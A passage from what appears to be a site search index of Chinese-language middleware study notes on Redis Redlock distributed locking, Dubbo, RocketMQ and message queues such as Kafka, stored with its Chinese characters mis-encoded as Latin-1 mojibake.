æ¯ä¸ªè¯·æ±‚éƒ½è®¾ç½®ä¸€ä¸ªè¶…æ—¶æ—¶é—´ï¼ˆæ¯«ç§’çº§åˆ«ï¼‰ï¼Œè¯¥è¶…æ—¶æ—¶é—´è¦è¿œå°äºé”çš„æœ‰æ•ˆæ—¶é—´ï¼Œè¿™æ ·ä¾¿äºå¿«é€Ÿå°è¯•ä¸ä¸‹ä¸€ä¸ªå®ä¾‹å‘é€è¯·æ±‚ã€‚ æ¯”å¦‚é”çš„è‡ªåŠ¨é‡Šæ”¾æ—¶é—´ 10sï¼Œåˆ™è¯·æ±‚çš„è¶…æ—¶æ—¶é—´å¯ä»¥è®¾ç½® 5~50 æ¯«ç§’å†…ï¼Œè¿™æ ·å¯ä»¥é˜²æ­¢å®¢æˆ·ç«¯é•¿æ—¶é—´é˜»å¡ã€‚ å®¢æˆ·ç«¯è·å–å½“å‰æ—¶é—´ T2 å¹¶å‡å»æ­¥éª¤ 1 çš„ T1 æ¥è®¡ç®—å‡ºè·å–é”æ‰€ç”¨çš„æ—¶é—´ï¼ˆT3 = T2 -T1ï¼‰ã€‚ å½“ä¸”ä»…å½“å®¢æˆ·ç«¯åœ¨å¤§å¤šæ•°å®ä¾‹ï¼ˆN/2 + 1ï¼‰è·å–æˆåŠŸï¼Œä¸”è·å–é”æ‰€ç”¨çš„æ€»æ—¶é—´ T3 å°äºé”çš„æœ‰æ•ˆæ—¶é—´ï¼Œæ‰è®¤ä¸ºåŠ é”æˆåŠŸï¼Œå¦åˆ™åŠ é”å¤±è´¥ã€‚ å¦‚æœç¬¬ 3 æ­¥åŠ é”æˆåŠŸï¼Œåˆ™æ‰§è¡Œä¸šåŠ¡é€»è¾‘æ“ä½œå…±äº«èµ„æºï¼Œ key çš„çœŸæ­£æœ‰æ•ˆæ—¶é—´ç­‰äºæœ‰æ•ˆæ—¶é—´å‡å»è·å–é”æ‰€ä½¿ç”¨çš„æ—¶é—´ï¼ˆæ­¥éª¤ 3 è®¡ç®—çš„ç»“æœï¼‰ã€‚ å¦‚æœå› ä¸ºæŸäº›åŸå› ï¼Œè·å–é”å¤±è´¥ï¼ˆæ²¡æœ‰åœ¨è‡³å°‘ N/2+1 ä¸ª Redis å®ä¾‹å–åˆ°é”æˆ–è€…å–é”æ—¶é—´å·²ç»è¶…è¿‡äº†æœ‰æ•ˆæ—¶é—´ï¼‰ï¼Œ å®¢æˆ·ç«¯åº”è¯¥åœ¨æ‰€æœ‰çš„ Redis å®ä¾‹ä¸Šè¿›è¡Œè§£é”ï¼ˆå³ä¾¿æŸäº› Redis å®ä¾‹æ ¹æœ¬å°±æ²¡æœ‰åŠ é”æˆåŠŸï¼‰ã€‚ å¦å¤–éƒ¨ç½²å®ä¾‹çš„æ•°é‡è¦æ±‚æ˜¯å¥‡æ•°ï¼Œä¸ºäº†èƒ½å¾ˆå¥½çš„æ»¡è¶³è¿‡åŠåŸåˆ™ï¼Œ å¦‚æœæ˜¯ 6 å°åˆ™éœ€è¦ 4 å°è·å–é”æˆåŠŸæ‰èƒ½è®¤ä¸ºæˆåŠŸï¼Œæ‰€ä»¥å¥‡æ•°æ›´åˆç† äº‹æƒ…å¯æ²¡è¿™ä¹ˆç®€å•ï¼ŒRedis ä½œè€…æŠŠè¿™ä¸ªæ–¹æ¡ˆæå‡ºåï¼Œå—åˆ°äº†ä¸šç•Œè‘—åçš„åˆ†å¸ƒå¼ç³»ç»Ÿä¸“å®¶çš„è´¨ç–‘ã€‚ ä¸¤äººå¥½æ¯”ç¥ä»™æ‰“æ¶ï¼Œä¸¤äººä¸€æ¥ä¸€å›è®ºæ®å……è¶³çš„å¯¹ä¸€ä¸ªé—®é¢˜æå‡ºå¾ˆå¤šè®ºæ–­â€¦â€¦: â€¢ Martin Kleppmann æå‡ºè´¨ç–‘çš„åšå®¢ï¼šhttps://martin.kleppmann.com/2016/02/08/how-to-do-distributed-locking.html â€¢ Redlock è®¾è®¡è€…çš„å›å¤ï¼šhttp://antirez.com/news/101 Redlock æ˜¯ä¸é Martin Kleppmann è®¤ä¸ºé”å®šçš„ç›®çš„æ˜¯ä¸ºäº†ä¿æŠ¤å¯¹å…±äº«èµ„æºçš„è¯»å†™ï¼Œè€Œåˆ†å¸ƒå¼é”åº”è¯¥ã€Œé«˜æ•ˆã€å’Œã€Œæ­£ç¡®ã€ é«˜æ•ˆæ€§ï¼šåˆ†å¸ƒå¼é”åº”è¯¥è¦æ»¡è¶³é«˜æ•ˆçš„æ€§èƒ½ï¼ŒRedlock ç®—æ³•å‘ 5 ä¸ªèŠ‚ç‚¹æ‰§è¡Œè·å–é”çš„é€»è¾‘æ€§èƒ½ä¸é«˜ï¼Œæˆæœ¬å¢åŠ ï¼Œå¤æ‚åº¦ä¹Ÿé«˜ï¼› æ­£ç¡®æ€§ï¼šåˆ†å¸ƒå¼é”åº”è¯¥é˜²æ­¢å¹¶å‘è¿›ç¨‹åœ¨åŒä¸€æ—¶åˆ»åªèƒ½æœ‰ä¸€ä¸ªçº¿ç¨‹èƒ½å¯¹å…±äº«æ•°æ®è¯»å†™ã€‚ å‡ºäºè¿™ä¸¤ç‚¹ï¼Œæˆ‘ä»¬æ²¡å¿…è¦æ‰¿æ‹… Redlock çš„æˆæœ¬å’Œå¤æ‚ï¼Œè¿è¡Œ 5 ä¸ª Redis å®ä¾‹å¹¶åˆ¤æ–­åŠ é”æ˜¯å¦æ»¡è¶³å¤§å¤šæ•°æ‰ç®—æˆåŠŸã€‚ ä¸»ä»æ¶æ„å´©æºƒæ¢å¤æå°å¯èƒ½å‘ç”Ÿï¼Œè¿™æ²¡ä»€ä¹ˆå¤§ä¸äº†çš„ã€‚ä½¿ç”¨å•æœºç‰ˆå°±å¤Ÿäº†ï¼ŒRedlock å¤ªé‡äº†ï¼Œæ²¡å¿…è¦ã€‚ Martin è®¤ä¸º Redlock æ ¹æœ¬è¾¾ä¸åˆ°å®‰å…¨æ€§çš„è¦æ±‚ï¼Œä¹Ÿä¾æ—§å­˜åœ¨é”å¤±æ•ˆçš„é—®é¢˜ï¼ Martin çš„ç»“è®º Redlock ä¸ä¼¦ä¸ç±»ï¼šå¯¹äºåå¥½æ•ˆç‡æ¥è®²ï¼ŒRedlock æ¯”è¾ƒé‡ï¼Œæ²¡å¿…è¦è¿™ä¹ˆåšï¼Œè€Œå¯¹äºåå¥½æ­£ç¡®æ€§æ¥è¯´ï¼ŒRedlock æ˜¯ä¸å¤Ÿå®‰å…¨çš„ã€‚ æ—¶é’Ÿå‡è®¾ä¸åˆç†ï¼šè¯¥ç®—æ³•å¯¹ç³»ç»Ÿæ—¶é’Ÿåšå‡ºäº†å±é™©çš„å‡è®¾ï¼ˆå‡è®¾å¤šä¸ªèŠ‚ç‚¹æœºå™¨æ—¶é’Ÿéƒ½æ˜¯ä¸€è‡´çš„ï¼‰ï¼Œå¦‚æœä¸æ»¡è¶³è¿™äº›å‡è®¾ï¼Œé”å°±ä¼šå¤±æ•ˆã€‚ æ— æ³•ä¿è¯æ­£ç¡®æ€§ï¼šRedlock ä¸èƒ½æä¾›ç±»ä¼¼ fencing token çš„æ–¹æ¡ˆï¼Œæ‰€ä»¥è§£å†³ä¸äº†æ­£ç¡®æ€§çš„é—®é¢˜ã€‚ä¸ºäº†æ­£ç¡®æ€§ï¼Œè¯·ä½¿ç”¨æœ‰ã€Œå…±è¯†ç³»ç»Ÿã€çš„è½¯ä»¶ï¼Œä¾‹å¦‚ Zookeeperã€‚ Redis ä½œè€… Antirez çš„åé©³ åœ¨ Redis ä½œè€…çš„åé©³æ–‡ç« ä¸­ï¼Œæœ‰ 3 ä¸ªé‡ç‚¹ï¼š æ—¶é’Ÿé—®é¢˜ï¼šRedlock å¹¶ä¸éœ€è¦å®Œå…¨ä¸€è‡´çš„æ—¶é’Ÿï¼Œåªéœ€è¦å¤§ä½“ä¸€è‡´å°±å¯ä»¥äº†ï¼Œå…è®¸æœ‰ã€Œè¯¯å·®ã€ï¼Œ åªè¦è¯¯å·®ä¸è¦è¶…è¿‡é”çš„ç§ŸæœŸå³å¯ï¼Œè¿™ç§å¯¹äºæ—¶é’Ÿçš„ç²¾åº¦è¦æ±‚å¹¶ä¸æ˜¯å¾ˆé«˜ï¼Œè€Œä¸”è¿™ä¹Ÿç¬¦åˆç°å®ç¯å¢ƒã€‚ ç½‘ç»œå»¶è¿Ÿã€è¿›ç¨‹æš‚åœé—®é¢˜ï¼š å®¢æˆ·ç«¯åœ¨æ‹¿åˆ°é”ä¹‹å‰ï¼Œæ— è®ºç»å†ä»€ä¹ˆè€—æ—¶é•¿é—®é¢˜ï¼ŒRedlock éƒ½èƒ½å¤Ÿåœ¨ç¬¬ 3 æ­¥æ£€æµ‹å‡ºæ¥ å®¢æˆ·ç«¯åœ¨æ‹¿åˆ°é”ä¹‹åï¼Œå‘ç”Ÿ NPCï¼Œé‚£ Redlockã€Zookeeper éƒ½æ— èƒ½ä¸ºåŠ› è´¨ç–‘ fencing token æœºåˆ¶ã€‚ Redisson åˆ†å¸ƒå¼é”","tags":"ä¸­é—´ä»¶","url":"/yq-doc-source-docs-Chaotic-middleware-Distributed-lock.html","loc":"/yq-doc-source-docs-Chaotic-middleware-Distributed-lock.html"},{"title":"Dubbo","text":"ä¸€ä¸ªRPCæ¡†æ¶ æ³¨å†Œä¸­å¿ƒ æœåŠ¡æ³¨å†Œ æœåŠ¡å‘ç°","tags":"ä¸­é—´ä»¶","url":"/yq-doc-source-docs-Chaotic-middleware-Dubbo.html","loc":"/yq-doc-source-docs-Chaotic-middleware-Dubbo.html"},{"title":"RocketMQ","text":"å¦‚ä½•é¿å…æ¶ˆæ¯ä¸¢å¤± æ–¹æ¡ˆä¸€ï¼šåŒæ­¥å‘é€ï¼‹å¤šæ¬¡é‡è¯• DefaultMQProducerå‘é€æ¶ˆæ¯çš„æ–¹å¼ å•å‘å‘é€ï¼šæ¶ˆæ¯å‘å‡ºå»å°±ä¸ç®¡äº† åŒæ­¥å‘é€ï¼šåŒæ­¥ç­‰å¾…Brokerå“åº” å¼‚æ­¥å‘é€ï¼šå¼‚æ­¥å¤„ç†Brokeré€šçŸ¥ é‡è¯•é˜Ÿåˆ—ä¸æ­»ä¿¡é˜Ÿåˆ—ä¿è¯æ¶ˆæ¯å®‰å…¨ æ–¹æ¡ˆäºŒï¼šRocketMQæä¾›çš„äº‹åŠ¡æ¶ˆæ¯æœºåˆ¶ TransactionMQProducer + TransactionListenerImpl å®ç°äº‹åŠ¡æ¶ˆæ¯å‘é€ å…³äºç¼“å­˜å†™åˆ°ç£ç›˜ RocketMQ åŒæ­¥åˆ·ç›˜, æ¯10æ¯«ç§’è¿›è¡Œä¸€æ¬¡åˆ·ç›˜; å¼‚æ­¥åˆ·ç›˜ï¼Œ å¦‚æœæ˜¯å †å†…å†…å­˜ï¼Œå¯ä»¥è®¾å®šåˆ·ç›˜çš„é—´éš”; å †å¤–å†…å­˜ï¼Œåªç®¡å†™å…¥pagecacheï¼Œç”±æ“ä½œç³»ç»Ÿè¿›è¡Œåˆ·ç›˜ã€‚ æ³¨è§£ pagecache æŒ‡å†…æ ¸æ€çš„é¡µç¼“å­˜ æ•´ä¸ªé“¾è·¯ä¿éšœæ¶ˆæ¯ä¸€è‡´ å¦‚æœæ¯ä¸€ä¸ªåœ°æ–¹éƒ½è¦ä¿éšœæ¶ˆæ¯ä¸ä¸¢å¤±, æ€§èƒ½ä¼šä¸‹é™, ç”šè‡³è¿˜ä¸å¦‚ä¸ç”¨MQ. æ‰€ä»¥, ç»¼åˆè€ƒè™‘ä½¿ç”¨åœºæ™¯...","tags":"ä¸­é—´ä»¶","url":"/yq-doc-source-docs-Chaotic-middleware-Mq-Rocketmq.html","loc":"/yq-doc-source-docs-Chaotic-middleware-Mq-Rocketmq.html"},{"title":"MQ","text":"RocketMQ ä¸»è¦æ˜¯é€‚ç”¨äºåˆ†å¸ƒå¼å¾®æœåŠ¡åœºæ™¯ä¸‹çš„, å•ä½“å°ä¸šåŠ¡ç”¨ä¸åˆ°. æ¶ˆæ¯é˜Ÿåˆ—ï¼ˆMessage Queueï¼Œç®€ç§°MQï¼‰æŒ‡ä¿å­˜æ¶ˆæ¯çš„ä¸€ä¸ªå®¹å™¨ï¼Œå…¶å®æœ¬è´¨å°±æ˜¯ä¸€ä¸ªä¿å­˜æ•°æ®çš„é˜Ÿåˆ—; æ¶ˆæ¯ä¸­é—´ä»¶æ˜¯æŒ‡åˆ©ç”¨é«˜æ•ˆå¯é çš„æ¶ˆæ¯ä¼ é€’æœºåˆ¶è¿›è¡Œä¸å¹³å°æ— å…³çš„æ•°æ®äº¤æµï¼Œå¹¶åŸºäºæ•°æ®é€šä¿¡æ¥è¿›è¡Œåˆ†å¸ƒå¼ç³»ç»Ÿçš„æ„å»º æ¶ˆæ¯ä¸­é—´ä»¶æ˜¯åˆ†å¸ƒå¼ç³»ç»Ÿä¸­é‡è¦çš„ç»„ä»¶ï¼Œä¸»è¦è§£å†³åº”ç”¨è§£è€¦ï¼Œå¼‚æ­¥æ¶ˆæ¯ï¼Œæµé‡å‰Šå³°ç­‰é—®é¢˜ï¼Œ å®ç°é«˜æ€§èƒ½ï¼Œé«˜å¯ç”¨ï¼Œå¯ä¼¸ç¼©å’Œæœ€ç»ˆä¸€è‡´æ€§çš„ç³»ç»Ÿæ¶æ„ã€‚ ç›®å‰ä½¿ç”¨è¾ƒå¤šçš„æ¶ˆæ¯é˜Ÿåˆ—æœ‰ActiveMQï¼ŒRabbitMQï¼ŒZeroMQï¼ŒKafkaï¼ŒMetaMQï¼ŒRocketMQç­‰ã€‚ ä¸»è¦ç”¨é€” è§£è€¦ å°†åŸæ¥å•ä½“é‡åº”ç”¨æ‹†åˆ†ä¸ºåˆ†å¸ƒå¼å¾®æœåŠ¡æ¶æ„, é€šè¿‡MQæ¶ˆæ¯é˜Ÿåˆ—é€šä¿¡, æé«˜å¯ç»´æŠ¤æ€§. ç³»ç»Ÿä¹‹é—´è€¦åˆè½¬ç§»ä¸ºä¸MQçš„è€¦åˆ å¼‚æ­¥ é¿å…å®Œå…¨ä¸²è¡ŒåŒ–, æé«˜æ•ˆç‡ å‰Šå³° å½“æŸä¸ªæ—¶æ®µè¯·æ±‚é‡, å¹¶å‘é‡å¤§æ—¶, ç»™åˆ°æ¶ˆæ¯é˜Ÿåˆ—é‡Œé¢å», æ…¢æ…¢å¤„ç†, ä¸è‡³äºè¢«ææŒ‚æ‰. å¼‚æ­¥è§£è€¦ä¸¾ä¾‹ åœ¨æ­£å¸¸ä¸šåŠ¡æµç¨‹ä¸­ï¼Œæ¯”è¾ƒè€—æ—¶è€Œä¸”ä¸éœ€è¦å³æ—¶è¿”å›ç»“æœçš„æ“ä½œã€‚ å°†è¿™äº›æ“ä½œå¯ä»¥åšä¸ºã€Œå¼‚æ­¥å¤„ç†ã€ï¼Œè¿™æ ·å¯ä»¥å¤§å¤§çš„åŠ å¿«è¯·æ±‚çš„å“åº”æ—¶é—´ã€‚ æœ€å¸¸è§çš„åœºæ™¯å°±æ˜¯ç”¨æˆ·æ³¨å†Œä¹‹åï¼Œéœ€è¦å‘é€æ³¨å†ŒçŸ­ä¿¡ã€é‚®ä»¶é€šçŸ¥ï¼Œä»¥å‘ŠçŸ¥ç›¸å…³ä¿¡æ¯ã€‚ æ­£å¸¸åšæ³•ï¼Œæ˜¯è¦ç»è¿‡ä¸‰å¤§æ­¥å¤„ç†ï¼šç”¨æˆ·ä¿¡æ¯å¤„ç†ã€å‘é€é‚®ä»¶ã€å‘é€çŸ­ä¿¡ï¼Œ ç­‰è¿™ä¸‰æ­¥å…¨éƒ¨éƒ½å®Œæˆä¹‹åï¼Œæ‰è¿”å›å‰ç«¯ï¼Œå‘Šè¯‰ä½ æ³¨å†ŒæˆåŠŸäº†ã€‚ ä½¿ç”¨MQï¼Œåªéœ€è¦åœ¨å¤„ç†å®Œç”¨æˆ·ä¿¡æ¯ä¹‹åï¼Œ ç»™MQå‘é€ä¸¤ä¸ªæ¶ˆæ¯å³å¯ï¼Œé‚®ä»¶æœåŠ¡ã€çŸ­ä¿¡æœåŠ¡ç›‘å¬MQçš„ä»»åŠ¡æ¶ˆæ¯ï¼Œæ ¹æ®æ¶ˆæ¯è¿›è¡Œå‘é€å³å¯ã€‚ è§£è€¦å¾®æœåŠ¡ä¸¾ä¾‹ è¿˜æ˜¯ç”¨æˆ·æ³¨å†Œçš„ä¾‹å­ï¼Œå°†ç”¨æˆ·æ³¨å†Œã€é‚®ä»¶/çŸ­ä¿¡å‘é€ç†è§£ä¸ºä¸¤ä¸ªç‹¬ç«‹çš„å¾®æœåŠ¡ï¼Œå°±éå¸¸å¥½ç†è§£ æµé‡å‰Šå³°å¡«è°· æ§åˆ¶æµé‡ï¼Œä¹Ÿæ˜¯MQæ¯”è¾ƒå¸¸ç”¨çš„ä¸€ä¸ªåœºæ™¯ï¼Œä¸€èˆ¬åœ¨ç§’æ€ã€ææ´»åŠ¨ä¸­ä½¿ç”¨å¹¿æ³›ã€‚ è¿™ä¸ªæ—¶å€™ä¸€èˆ¬ç”¨æˆ·è¯·æ±‚é‡ä¼šæ¿€å¢ï¼Œå¯èƒ½ä¼šè¿œè¶…å½“å‰ç³»ç»Ÿçš„æœ€å¤§å¤„ç†é‡ï¼Œå¦‚æœä¸åšä»»ä½•å¤„ç†ï¼Œç³»ç»Ÿå¯èƒ½å°±ä¼šå®•æ‰ã€‚ ä½¿ç”¨MQï¼Œå¯ä»¥å°†éœ€è¦å¤„ç†çš„æ¶ˆæ¯å…¨éƒ¨æ”¾å…¥å…¶ä¸­ï¼Œç³»ç»ŸæŒ‰ç…§æœ€å¤§å¤„ç†èƒ½åŠ›ï¼Œ å»è·å–æ¶ˆæ¯è¿›è¡Œæ¶ˆè´¹ï¼Œè¿™æ ·å°±å¯ä»¥å°†ä¸€ç¬é—´è¿‡æ¥çš„è¯·æ±‚ï¼Œåˆ†æ•£åˆ°ä¸€æ®µæ—¶é—´å†…è¿›è¡Œå¤„ç†ï¼Œé¿å…äº†ç³»ç»Ÿçš„å´©æºƒã€‚ æ¶ˆæ¯åˆ†å‘ è¿™ä¸ªä¹ŸæŒºå¸¸ç”¨ã€‚å¤šä¸ªç³»ç»Ÿå¯¹åŒä¸€ä¸ªæ•°æ®æ„Ÿå…´è¶£ï¼Œåªéœ€è¦ç›‘å¬åŒä¸€ç±»æ¶ˆæ¯å³å¯ã€‚ ä¾‹å¦‚ä»˜æ¬¾ç³»ç»Ÿï¼Œåœ¨ä»˜æ¬¾æˆåŠŸä¹‹åï¼Œæ­£å¸¸åšæ³•æ˜¯é€šçŸ¥å¤–å›´ç³»ç»Ÿè¿™ä¸ªå•å­ä»˜æ¬¾æˆåŠŸäº†ï¼Œ æˆ–è€…æ˜¯å¤–å›´ç³»ç»Ÿå®šæ—¶æ¥æ‹‰å–ä»˜æ¬¾ç»“æœï¼Œ ä½¿ç”¨MQåï¼Œä»˜æ¬¾ç³»ç»Ÿå¯ä»¥åœ¨ä»˜æ¬¾æˆåŠŸä¹‹åï¼Œå°†æ¶ˆæ¯æ”¾åˆ°MQé‡Œé¢ï¼Œ æƒ³çŸ¥é“è¿™ä¸ªç»“æœçš„ç³»ç»Ÿè®¢é˜…è¿™ä¸ªä¸»é¢˜çš„æ¶ˆæ¯å³å¯ï¼Œéå¸¸æ–¹ä¾¿ï¼Œä¹Ÿä¸éœ€è¦å®šæ—¶å»æ‹‰å–æ•°æ®äº†ã€‚ äº‹åŠ¡æ¶ˆæ¯å‘é€æ­¥éª¤å¦‚ä¸‹ å‘é€æ–¹å°†åŠäº‹åŠ¡æ¶ˆæ¯å‘é€è‡³æ¶ˆæ¯é˜Ÿåˆ—RocketMQã€‚ æ¶ˆæ¯é˜Ÿåˆ—RocketMQå°†æ¶ˆæ¯æŒä¹…åŒ–æˆåŠŸä¹‹åï¼Œå‘å‘é€æ–¹è¿”å›Ackç¡®è®¤æ¶ˆæ¯å·²ç»å‘é€æˆåŠŸï¼Œæ­¤æ—¶æ¶ˆæ¯ä¸ºåŠäº‹åŠ¡æ¶ˆæ¯ã€‚ å‘é€æ–¹å¼€å§‹æ‰§è¡Œæœ¬åœ°äº‹åŠ¡é€»è¾‘ã€‚ å‘é€æ–¹æ ¹æ®æœ¬åœ°äº‹åŠ¡æ‰§è¡Œç»“æœå‘æœåŠ¡ç«¯æäº¤äºŒæ¬¡ç¡®è®¤ï¼ˆCommitæˆ–æ˜¯Rollbackï¼‰ï¼Œ æœåŠ¡ç«¯æ”¶åˆ°CommitçŠ¶æ€åˆ™å°†åŠäº‹åŠ¡æ¶ˆæ¯æ ‡è®°ä¸ºå¯æŠ•é€’ï¼Œè®¢é˜…æ–¹æœ€ç»ˆå°†æ”¶åˆ°è¯¥æ¶ˆæ¯ï¼› æœåŠ¡ç«¯æ”¶åˆ°RollbackçŠ¶æ€åˆ™åˆ é™¤åŠäº‹åŠ¡æ¶ˆæ¯ï¼Œè®¢é˜…æ–¹å°†ä¸ä¼šæ¥å—è¯¥æ¶ˆæ¯ã€‚ äº‹åŠ¡æ¶ˆæ¯å›æŸ¥æ­¥éª¤å¦‚ä¸‹ï¼š åœ¨æ–­ç½‘æˆ–è€…æ˜¯åº”ç”¨é‡å¯çš„ç‰¹æ®Šæƒ…å†µä¸‹ï¼Œ ä¸Šè¿°æ­¥éª¤4æäº¤çš„äºŒæ¬¡ç¡®è®¤æœ€ç»ˆæœªåˆ°è¾¾æœåŠ¡ç«¯ï¼Œç»è¿‡å›ºå®šæ—¶é—´åæœåŠ¡ç«¯å°†å¯¹è¯¥æ¶ˆæ¯å‘èµ·æ¶ˆæ¯å›æŸ¥ã€‚ å‘é€æ–¹æ”¶åˆ°æ¶ˆæ¯å›æŸ¥åï¼Œéœ€è¦æ£€æŸ¥å¯¹åº”æ¶ˆæ¯çš„æœ¬åœ°äº‹åŠ¡æ‰§è¡Œçš„æœ€ç»ˆç»“æœã€‚ å‘é€æ–¹æ ¹æ®æ£€æŸ¥å¾—åˆ°çš„æœ¬åœ°äº‹åŠ¡çš„æœ€ç»ˆçŠ¶æ€å†æ¬¡æäº¤äºŒæ¬¡ç¡®è®¤ï¼ŒæœåŠ¡ç«¯ä»æŒ‰ç…§æ­¥éª¤4å¯¹åŠäº‹åŠ¡æ¶ˆæ¯è¿›è¡Œæ“ä½œã€‚ ç¼ºç‚¹ ç³»ç»Ÿå¯ç”¨æ€§é™ä½ ç³»ç»Ÿå¯ç”¨æ€§åœ¨æŸç§ç¨‹åº¦ä¸Šé™ä½ã€‚åœ¨åŠ å…¥MQä¹‹å‰ï¼Œ ä½ ä¸ç”¨è€ƒè™‘æ¶ˆæ¯ä¸¢å¤±æˆ–è€…è¯´MQæŒ‚æ‰ç­‰ç­‰çš„æƒ…å†µï¼Œä½†æ˜¯ï¼Œå¼•å…¥MQä¹‹åä½ å°±éœ€è¦å»è€ƒè™‘äº†ï¼ ç³»ç»Ÿå¤æ‚æ€§æé«˜ é‡å¤æ¶ˆè´¹ã€æ¶ˆæ¯ä¸¢å¤±ã€æ¶ˆæ¯çš„é¡ºåºæ¶ˆè´¹ç­‰ç­‰ï¼Œåæ­£ç”¨äº†ä¹‹åå°±æ˜¯è´¼çƒ¦ã€‚ æ•°æ®ä¸€è‡´æ€§ åˆ†å¸ƒå¼æœåŠ¡æœ¬èº«å°±å­˜åœ¨çš„ä¸€ä¸ªé—®é¢˜ï¼Œä¸ä»…ä»…æ˜¯æ¶ˆæ¯é˜Ÿåˆ—çš„é—®é¢˜ï¼Œ ä½†æ˜¯æ”¾åœ¨è¿™é‡Œè¯´æ˜¯å› ä¸ºç”¨äº†æ¶ˆæ¯é˜Ÿåˆ—è¿™ä¸ªé—®é¢˜ä¼šæš´éœ²å¾—æ¯”è¾ƒä¸¥é‡ä¸€ç‚¹ æœ‰ä¸€ä¸ªè§£å†³æ–¹æ¡ˆæ˜¯ åˆ†å¸ƒå¼äº‹åŠ¡ : æŠŠç›¸å…³æ“ä½œå¦‚ ä¸‹å•ï¼Œä¼˜æƒ åˆ¸ï¼Œç§¯åˆ†ã€‚ã€‚ã€‚ éƒ½æ”¾åœ¨ä¸€ä¸ªäº‹åŠ¡é‡Œé¢ä¸€æ ·ï¼Œè¦æˆåŠŸä¸€èµ·æˆåŠŸï¼Œè¦å¤±è´¥ä¸€èµ·å¤±è´¥ã€‚ æ¶ˆæ¯é˜Ÿåˆ—MQè®¾è®¡ å¤§è‡´æµç¨‹: Producer ----send----> Broker ----receive----> Consumer æ¶ˆæ¯å­˜å‚¨ --æ¶ˆæ¯æ¶ˆè´¹--> <--æ¶ˆæ¯ç¡®è®¤-- æ¶ˆæ¯å¤‡ä»½/åˆ é™¤ Producer æ¶ˆæ¯ç”Ÿäº§è€…ï¼šè´Ÿè´£äº§ç”Ÿå’Œå‘é€æ¶ˆæ¯åˆ° Brokerï¼› Broker æ¶ˆæ¯å¤„ç†ä¸­å¿ƒï¼šè´Ÿè´£æ¶ˆæ¯å­˜å‚¨ã€ç¡®è®¤ã€é‡è¯•ç­‰ï¼Œä¸€èˆ¬å…¶ä¸­ä¼šåŒ…å«å¤šä¸ª queueï¼› Consumer æ¶ˆæ¯æ¶ˆè´¹è€…ï¼šè´Ÿè´£ä» Broker ä¸­è·å–æ¶ˆæ¯ï¼Œå¹¶è¿›è¡Œç›¸åº”å¤„ç†ï¼› åˆ†ç±» Kafka ActiveMQ RabbitMQ RocketMQ ç­‰è¿™å‡ ç§ ActiveMQå’ŒRabbitMQè¿™ä¸¤ç€å› ä¸ºååé‡è¿˜æœ‰GitHubçš„ç¤¾åŒºæ´»è·ƒåº¦çš„åŸå› ï¼Œ åœ¨å„å¤§äº’è”ç½‘å…¬å¸éƒ½å·²ç»åŸºæœ¬ä¸Šç»è¿¹äº†ï¼Œ ä¸šåŠ¡ä½“é‡ä¸€èˆ¬çš„å…¬å¸ä¼šæ˜¯æœ‰åœ¨ç”¨çš„ï¼Œ ä½†æ˜¯è¶Šæ¥è¶Šå¤šçš„å…¬å¸æ›´é’çRocketMQè¿™æ ·çš„æ¶ˆæ¯ä¸­é—´ä»¶äº†ã€‚ æ²¡æœ‰æœ€å¥½çš„æŠ€æœ¯ï¼Œåªæœ‰æœ€é€‚åˆçš„æŠ€æœ¯ï¼Œä¸è¦ä¸ºäº†ç”¨è€Œç”¨ ActiveMQ ä¼˜ç‚¹ å•æœºååé‡ï¼šä¸‡çº§ æ—¶æ•ˆæ€§ï¼šmsçº§ å¯ç”¨æ€§ï¼šé«˜ï¼ŒåŸºäºä¸»ä»æ¶æ„å®ç°é«˜å¯ç”¨æ€§ æ¶ˆæ¯å¯é æ€§ï¼šæœ‰è¾ƒä½çš„æ¦‚ç‡ä¸¢å¤±æ•°æ® åŠŸèƒ½æ”¯æŒï¼šMQé¢†åŸŸçš„åŠŸèƒ½æå…¶å®Œå¤‡ ç¼ºç‚¹: å®˜æ–¹ç¤¾åŒºç°åœ¨å¯¹ActiveMQ 5.xç»´æŠ¤è¶Šæ¥è¶Šå°‘ï¼Œè¾ƒå°‘åœ¨å¤§è§„æ¨¡ååçš„åœºæ™¯ä¸­ä½¿ç”¨ã€‚ Kafka å·ç§°å¤§æ•°æ®çš„æ€æ‰‹é”ï¼Œè°ˆåˆ°å¤§æ•°æ®é¢†åŸŸå†…çš„æ¶ˆæ¯ä¼ è¾“ï¼Œåˆ™ç»•ä¸å¼€Kafkaï¼Œ è¿™æ¬¾ä¸ºå¤§æ•°æ®è€Œç”Ÿçš„æ¶ˆæ¯ä¸­é—´ä»¶ï¼Œä»¥å…¶ç™¾ä¸‡çº§TPSçš„ååé‡åå£°å¤§å™ªï¼Œ è¿…é€Ÿæˆä¸ºå¤§æ•°æ®é¢†åŸŸçš„å® å„¿ï¼Œåœ¨æ•°æ®é‡‡é›†ã€ä¼ è¾“ã€å­˜å‚¨çš„è¿‡ç¨‹ä¸­å‘æŒ¥ç€ä¸¾è¶³è½»é‡çš„ä½œç”¨ã€‚ Apache Kafkaå®ƒæœ€åˆç”±LinkedInå…¬å¸åŸºäºç‹¬ç‰¹çš„è®¾è®¡å®ç°ä¸º ä¸€ä¸ªåˆ†å¸ƒå¼çš„æäº¤æ—¥å¿—ç³»ç»Ÿ( a distributed commit log)ï¼Œä¹‹åæˆä¸ºApacheé¡¹ç›®çš„ä¸€éƒ¨åˆ†ã€‚ ç›®å‰å·²ç»è¢«LinkedInï¼ŒUber, Twitter, Netflixç­‰å¤§å…¬å¸æ‰€é‡‡çº³ã€‚ ä¼˜ç‚¹ æ€§èƒ½å“è¶Šï¼Œå•æœºå†™å…¥TPSçº¦åœ¨ç™¾ä¸‡æ¡/ç§’(é›†ç¾¤, å•æœºåªæœ‰åä¸‡)ï¼Œæœ€å¤§çš„ä¼˜ç‚¹ï¼Œå°±æ˜¯ååé‡é«˜ã€‚ æ—¶æ•ˆæ€§ï¼šmsçº§ å¯ç”¨æ€§ï¼šéå¸¸é«˜ï¼Œkafkaæ˜¯åˆ†å¸ƒå¼çš„ï¼Œä¸€ä¸ªæ•°æ®å¤šä¸ªå‰¯æœ¬ï¼Œå°‘æ•°æœºå™¨å®•æœºï¼Œä¸ä¼šä¸¢å¤±æ•°æ®ï¼Œä¸ä¼šå¯¼è‡´ä¸å¯ç”¨ æ¶ˆè´¹è€…é‡‡ç”¨Pullæ–¹å¼è·å–æ¶ˆæ¯, æ¶ˆæ¯æœ‰åº, é€šè¿‡æ§åˆ¶èƒ½å¤Ÿä¿è¯æ‰€æœ‰æ¶ˆæ¯è¢«æ¶ˆè´¹ä¸”ä»…è¢«æ¶ˆè´¹ä¸€æ¬¡; 